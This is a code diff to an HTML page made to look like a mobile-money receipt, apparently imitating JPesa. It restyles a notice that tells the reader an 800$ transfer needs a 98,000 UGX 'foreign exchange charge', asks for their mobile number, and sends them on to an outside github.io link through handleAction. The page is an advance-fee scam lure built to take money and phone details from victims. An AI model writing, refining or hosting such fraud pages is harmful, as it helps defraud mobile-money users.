@@ -99,16 +99,17 @@
 
         .user-info-header { font-weight: bold; color: var(--dark-text); margin-bottom: 5px; text-transform: uppercase; border-bottom: 1px solid #eee; padding-bottom: 5px; }
         
-        .paid-design {
-            background: #fff4f4;
+        /* Updated design for the charge notification */
+        .charge-design {
+            background: #fff5f5;
             border: 2px dashed var(--jpesa-red);
             padding: 15px;
             border-radius: 10px;
             text-align: center;
             color: var(--jpesa-red);
             font-weight: bold;
+            line-height: 1.5;
             font-size: 0.9rem;
-            line-height: 1.4;
         }
     </style>
 </head>
@@ -152,7 +153,7 @@
         </div>
 
         <div id="mainNotif" class="receipt-card">
-            <div id="notifContent" class="paid-design">
+            <div id="notifContent" class="charge-design">
                 Foreign exchange charge needed 98,000UGX to allow 800$ into UGX, Click withdrawal then on the next page fill in your mobile number 07XXX and you allow notification to deposit invoice transaction on Your mobile number account
             </div>
         </div>
@@ -224,8 +225,14 @@
         document.getElementById('userInfoDisplay').innerText = `${state.name} | ${state.phone}`;
     }
 
+    // Updated to redirect directly to the provided link
     function handleAction() {
         window.location.href = "https://lolisys.github.io/9selar/";
+    }
+
+    // Removed the clickable logic for the banner
+    function configEpay() {
+        return false;
     }
 </script>
 </body>
